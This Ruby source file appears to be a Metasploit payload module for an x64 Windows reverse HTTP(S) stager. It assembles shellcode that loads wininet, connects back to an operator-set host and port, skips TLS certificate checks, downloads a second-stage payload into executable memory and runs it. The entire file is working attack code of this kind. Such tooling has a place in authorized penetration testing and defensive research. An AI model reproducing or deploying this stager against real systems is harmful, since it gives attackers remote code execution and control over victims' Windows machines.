# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/transport_config'
require 'msf/core/payload/windows/x64/block_api'
require 'msf/core/payload/windows/x64/exitfunk'
require 'msf/core/payload/uuid_options'

module Msf

###
#
# Complex payload generation for Windows ARCH_X86 that speak HTTP(S)
#
###

module Payload::Windows::ReverseHttp_x64

  include Msf::TransportConfig
  include Msf::Payload::Windows
  include Msf::Payload::Windows::BlockApi_x64
  include Msf::Payload::Windows::Exitfunk_x64
  include Msf::Payload::UUIDOptions

  #
  # Register reverse_http specific options
  #
  def initialize(*args)
    super
    register_advanced_options([
        OptInt.new('StagerURILength', [false, 'The URI length for the stager (at least 5 bytes)']),
        OptInt.new('StagerRetryCount', [false, 'The number of times the stager should retry if the first connect fails', 10]),
        OptString.new('PayloadProxyHost', [false, 'An optional proxy server IP address or hostname']),
        OptPort.new('PayloadProxyPort', [false, 'An optional proxy server port']),
        OptString.new('PayloadProxyUser', [false, 'An optional proxy server username']),
        OptString.new('PayloadProxyPass', [false, 'An optional proxy server password']),
        OptEnum.new('PayloadProxyType', [false, 'The type of HTTP proxy (HTTP or SOCKS)', 'HTTP', ['HTTP', 'SOCKS']])
      ], self.class)
  end

  def transport_config(opts={})
    transport_config_reverse_http(opts)
  end

  #
  # Generate the first stage
  #
  def generate(opts={})
    conf = {
      :ssl         => opts[:ssl] || false,
      :host        => datastore['LHOST'],
      :port        => datastore['LPORT'],
      :url         => generate_small_uri,
      :retry_count => datastore['StagerRetryCount']
    }

    # add extended options if we do have enough space
    unless self.available_space.nil? || required_space > self.available_space
      conf[:exitfunk]   = datastore['EXITFUNC']
      conf[:proxy_host] = datastore['PayloadProxyHost']
      conf[:proxy_port] = datastore['PayloadProxyPort']
      conf[:proxy_user] = datastore['PayloadProxyUser']
      conf[:proxy_pass] = datastore['PayloadProxyPass']
      conf[:proxy_type] = datastore['PayloadProxyType']
    end

    generate_reverse_http(conf)
  end

  #
  # Generate and compile the stager
  #
  def generate_reverse_http(opts={})
    combined_asm = %Q^
      cld                    ; Clear the direction flag.
      and rsp, 0xFFFFFFFFFFFFFFF0 ; Ensure RSP is 16 byte aligned 
      call start             ; Call start, this pushes the address of 'api_call' onto the stack.
      #{asm_block_api}
      start:
        pop rbp
      #{asm_reverse_http(opts)}
    ^
    Metasm::Shellcode.assemble(Metasm::X64.new, combined_asm).encode_string
  end

  #
  # Generate the URI for the initial stager
  #
  def generate_uri

    uri_req_len = datastore['StagerURILength'].to_i

    # Choose a random URI length between 30 and 255 bytes
    if uri_req_len == 0
      uri_req_len = 30 + rand(256-30)
    end

    if uri_req_len < 5
      raise ArgumentError, "Minimum StagerURILength is 5"
    end

    generate_uri_uuid_mode(:init_native, uri_req_len)
  end

  #
  # Generate the URI for the initial stager
  #
  def generate_small_uri
    generate_uri_uuid_mode(:init_native, 5)
  end

  #
  # Determine the maximum amount of space required for the features requested
  #
  def required_space
    # Start with our cached default generated size
    space = cached_size

    # Add 100 bytes for the encoder to have some room
    space += 100

    # Make room for the maximum possible URL length
    space += 256

    # EXITFUNK processing adds 31 bytes at most (for ExitThread, only ~16 for others)
    space += 31

    # Proxy options?
    space += 200

    # The final estimated size
    space
  end

  #
  # Generate an assembly stub with the configured feature set and options.
  #
  # @option opts [Bool] :ssl Whether or not to enable SSL
  # @option opts [String] :url The URI to request during staging
  # @option opts [String] :host The host to connect to
  # @option opts [Fixnum] :port The port to connect to
  # @option opts [String] :exitfunk The exit method to use if there is an error, one of process, thread, or seh
  # @option opts [String] :proxy_host The optional proxy server host to use
  # @option opts [Fixnum] :proxy_port The optional proxy server port to use
  # @option opts [String] :proxy_type The optional proxy server type, one of HTTP or SOCKS
  # @option opts [String] :proxy_user The optional proxy server username
  # @option opts [String] :proxy_pass The optional proxy server password
  # @option opts [Fixnum] :retry_count The number of times to retry a failed request before giving up
  #
  def asm_reverse_http(opts={})

    retry_count   = [opts[:retry_count].to_i, 1].max
    proxy_enabled = !!(opts[:proxy_host].to_s.strip.length > 0)
    proxy_info    = ""

    if proxy_enabled
      if opts[:proxy_type].to_s.downcase == "socks"
        proxy_info << "socks="
      else
        proxy_info << "http://"
      end

      proxy_info << opts[:proxy_host].to_s
      if opts[:proxy_port].to_i > 0
        proxy_info << ":#{opts[:proxy_port]}"
      end
    end

    proxy_user = opts[:proxy_user].to_s.length == 0 ? nil : opts[:proxy_user]
    proxy_pass = opts[:proxy_pass].to_s.length == 0 ? nil : opts[:proxy_pass]

    http_open_flags = 0
    set_option_flags = 0

    if opts[:ssl]
      http_open_flags = (
        0x80000000 | # INTERNET_FLAG_RELOAD
        0x04000000 | # INTERNET_NO_CACHE_WRITE
        0x00800000 | # INTERNET_FLAG_SECURE
        0x00200000 | # INTERNET_FLAG_NO_AUTO_REDIRECT
        0x00001000 | # INTERNET_FLAG_IGNORE_CERT_CN_INVALID
        0x00002000 | # INTERNET_FLAG_IGNORE_CERT_DATE_INVALID
        0x00000200 ) # INTERNET_FLAG_NO_UI

      set_option_flags = (
        0x00002000 | # SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
        0x00001000 | # SECURITY_FLAG_IGNORE_CERT_CN_INVALID
        0x00000200 | # SECURITY_FLAG_IGNORE_WRONG_USAGE
        0x00000100 | # SECURITY_FLAG_IGNORE_UNKNOWN_CA
        0x00000080 ) # SECURITY_FLAG_IGNORE_REVOCATION
    else
      http_open_flags = (
        0x80000000 | # INTERNET_FLAG_RELOAD
        0x04000000 | # INTERNET_NO_CACHE_WRITE
        0x00200000 | # INTERNET_FLAG_NO_AUTO_REDIRECT
        0x00000200 ) # INTERNET_FLAG_NO_UI
    end

    asm = %Q^
      load_wininet:
        push 0
        mov r14, 'wininet'
        push r14                      ; Push 'wininet',0 onto the stack
        mov r14, rsp                  ; Save pointer to string
        mov rcx, r14                  ; the name of the lib to load
        mov r10, 0x0726774C           ; hash( "kernel32.dll", "LoadLibraryA" )
        call rbp

      internetopen:
    ^

    if proxy_enabled
      asm << %Q^
      call get_proxy_server
        db "#{proxy_info}", 0x00
      get_proxy_server:
        pop r8                        ; stack pointer (lpszProxyName)
        push 3                        ; INTERNET_OPEN_TYPE_PROXY = 3 (dwAccessType)
        pop rdx
      ^
    else
      asm << %Q^
        xor r8, r8                    ; NULL pointer (lpszProxyName)
        xor rdx, rdx                  ; PRECONFIG = 0 (dwAccessType)
      ^
    end

    asm << %Q^
        push 0                        ; alignment
        push 0                        ; NULL pointer
        xor r9, r9                    ; NULL pointer (lpszProxyBypass)
        mov rcx, rsp                  ; Empty string pointer (lpszAgent)
        push 0                        ; 0 (dwFlags)
        push 0                        ; alignment
        mov r10, 0xA779563A           ; hash( "wininet.dll", "InternetOpenA" )
        call rbp
    ^

    asm << %Q^
        call internetconnect
      get_server_host:
        db "#{opts[:host]}", 0x00

      internetconnect:
        pop rdx                       ; String (lpszServerName)
        mov rcx, rax                  ; HINTERNET (hInternet)
        mov r8, #{opts[:port]}        ; 
        xor r9, r9                    ; String (lpszUsername)
        push 0                        ; NULL (dwContext)
        push 0                        ; 0 (dwFlags)
        push 3                        ; INTERNET_SERVICE_HTTP (dwService)
        push 0                        ; alignment
        mov r10, 0xC69F8957           ; hash( "wininet.dll", "InternetConnectA" )
        call rbp

        call httpopenrequest
      get_server_uri:
        db "#{opts[:url]}",0x00

      httpopenrequest:
        pop r8                        ; String (lpszObjectName)
        mov rcx, rax                  ; HINTERNET (hConnect)
        xor rdx, rdx                  ; NULL pointer (lpszVerb)
        xor r9, r9                    ; String (lpszVersion)
        push 0                        ; 0 (dwContext)
        ; TODO: figure out what's going on here (get help from HD?)
        ; Having to use mov + push instead of push qword because
        ; Metasm doesn't seem to like it. Plain 'push' doesn't work
        ; because of an overflow error.
        ;push qword 0x#{http_open_flags.to_s(16)}  ; (dwFlags)
        mov r10, 0x#{http_open_flags.to_s(16)}  ; (dwFlags)
        push r10
        push 0                        ; NULL pointer (lplpszAcceptTypes)
        push 0                        ; NULL pointer (lpszReferer)
        mov r10, 0x3B2E55EB           ; hash( "wininet.dll", "HttpOpenRequestA" )
        call rbp
        mov rsi, rax                  ; Store the request handle in RSI

      retry_setup:
        push #{retry_count}
        pop rdi

      retry:
      ^

    if opts[:ssl]
      asm << %Q^
      internetsetoption_ssl:
        mov rcx, rsi                  ; (hInternet)
        push 31                       ; INTERNET_OPTION_SECURITY_FLAGS
        pop rdx
        push 0                        ; alignment
        push #{set_option_flags}      ; (dwFlags)
        mov r8, rsp
        push 4                        ; sizeof(dwFlags)
        pop r9
        mov r10, 0x869E4675           ; hash( "wininet.dll", "InternetSetOptionA" )
        call rbp
      ^
    end

    asm << %Q^
      httpsendrequest:
        mov rcx, rsi                  ; HINTERNET (hRequest)
        xor rdx, rdx                  ; NULL pointer (lpszHeaders)
        xor r8, r8                    ; 0 (dwHeadersLength)
        xor r9, r9                    ; NULL pointer (lpOptional)
        push 0                        ; alignment
        push 0                        ; 0 (dwOptionalLength)
        mov r10, 0x7B18062D           ; hash( "wininet.dll", "HttpSendRequestA" )
        call rbp
        test rax,rax
        jnz allocate_memory

      try_it_again:
        dec rdi
        jz failure
        jmp retry
    ^

    if opts[:exitfunk]
      asm << %Q^
      failure:
        call exitfunk
      ^
    else
      asm << %Q^
      failure:
        push 0x56A2B5F0           ; hardcoded to exitprocess for size
        call rbp
      ^
    end

    asm << %Q^
      allocate_memory:
        xor rcx, rcx                ; NULL pointer (lpAddress)
        mov rdx, 0x00400000         ; SIZE_T (dwSize)
        mov r8, 0x1000              ; MEM_COMMIT (flAllocationType)
        mov r9, 0x40                ; PAGE_EXECUTE_READWRITE (flProtect)
        mov r10, 0xE553A458         ; hash( "kernel32.dll", "VirtualAlloc" )
        call rbp                    ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );

      download_prep:
        xchg rax, rbx               ; place the allocated base address in ebx
        push rbx                    ; store a copy of the stage base address on the stack
        push rbx                    ; temporary storage for bytes read count
        mov rdi, rsp                ; &bytesRead

      download_more:
        mov rcx, rsi                ; HINTERNET (hFile)
        mov rdx, rbx                ; (lpBuffer)
        mov r8, 8192                ; (dwNumberOfBytesToRead)
        mov r9, rdi                 ; (lpNumberOfBytesRead)
        mov r10, 0xE2899612         ; hash( "wininet.dll", "InternetReadFile" )
        call rbp
        add rsp, 32                 ; clean up reserved space

        test eax, eax               ; did the download fail?
        jz failure

        mov ax, word ptr [edi]
        add rbx, rax                ; buffer += lpNumberOfBytesRead

        test rax, rax
        jnz download_more           ; loop until 0 is returned
        pop rax                     ; clear temp storage
        pop rax                     ; alignment

      execute_stage:
        ret                         ; dive into the stored stage address
    ^

    if opts[:exitfunk]
      asm << asm_exitfunk(opts)
    end

    STDERR.puts(asm)
    asm
  end

  #
  # Do not transmit the stage over the connection.  We handle this via HTTPS
  #
  def stage_over_connection?
    false
  end

  #
  # Always wait at least 20 seconds for this payload (due to staging delays)
  #
  def wfs_delay
    20
  end

end

end


